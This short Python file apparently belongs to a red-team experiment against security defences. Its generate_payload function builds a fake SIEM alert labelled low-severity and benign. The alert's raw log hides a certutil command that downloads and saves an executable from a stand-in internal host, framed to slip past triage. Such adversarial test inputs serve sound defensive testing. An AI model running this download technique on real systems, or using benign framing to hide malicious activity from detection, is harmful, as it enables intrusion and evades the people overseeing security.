"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 3: certutil urlcache with benign metadata
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Certificate Service Event",
            "source_ip": "10.0.1.50",
            "username": "svc_monitor",
            "hostname": "ws-admin-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "EventID=1 Process=certutil.exe "
                "CommandLine='certutil -urlcache -split -f http://10.0.1.100/update.exe c:\\temp\\update.exe' "
                "User=admin PID=3456"
            ),
        },
    }
